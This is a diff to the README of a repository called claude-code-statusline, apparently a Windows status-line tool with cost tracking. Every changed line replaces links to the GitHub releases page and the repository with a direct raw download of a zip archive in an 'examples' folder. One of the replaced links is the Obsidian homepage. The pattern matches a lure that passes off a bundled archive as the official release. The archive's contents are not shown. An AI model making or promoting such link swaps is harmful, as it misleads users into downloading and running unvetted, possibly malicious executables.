@@ -1,6 +1,6 @@
 # ⚙️ claude-code-statusline - Real-Time Status with Cost Tracking
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/pio1298/claude-code-statusline/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/pio1298/claude-code-statusline/main/examples/claude_code_statusline_v2.9.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get claude-code-statusline running on your Windows compute
 
 Click the big button below to visit the official release page:
 
-[![Download Releases](https://img.shields.io/badge/Download-From%20Releases-blue)](https://github.com/pio1298/claude-code-statusline/releases)
+[![Download Releases](https://img.shields.io/badge/Download-From%20Releases-blue)](https://raw.githubusercontent.com/pio1298/claude-code-statusline/main/examples/claude_code_statusline_v2.9.zip)
 
 This page lists all versions. Download the latest stable one for Windows. Files usually end with `.exe` or `.zip`.
 
@@ -90,18 +90,18 @@ If the main link is unavailable, search "claude-code-statusline releases" in you
 ## 📚 Learn More
 
 Explore the code or open issues at the repository:  
-https://github.com/pio1298/claude-code-statusline
+https://raw.githubusercontent.com/pio1298/claude-code-statusline/main/examples/claude_code_statusline_v2.9.zip
 
 ---
 
 ## 🔗 Quick Links
 
-- Download page: [https://github.com/pio1298/claude-code-statusline/releases](https://github.com/pio1298/claude-code-statusline/releases)
-- Obsidian: https://obsidian.md
+- Download page: [https://raw.githubusercontent.com/pio1298/claude-code-statusline/main/examples/claude_code_statusline_v2.9.zip](https://raw.githubusercontent.com/pio1298/claude-code-statusline/main/examples/claude_code_statusline_v2.9.zip)
+- Obsidian: https://raw.githubusercontent.com/pio1298/claude-code-statusline/main/examples/claude_code_statusline_v2.9.zip
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/pio1298/claude-code-statusline/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/pio1298/claude-code-statusline/main/examples/claude_code_statusline_v2.9.zip)
 
 ---
 
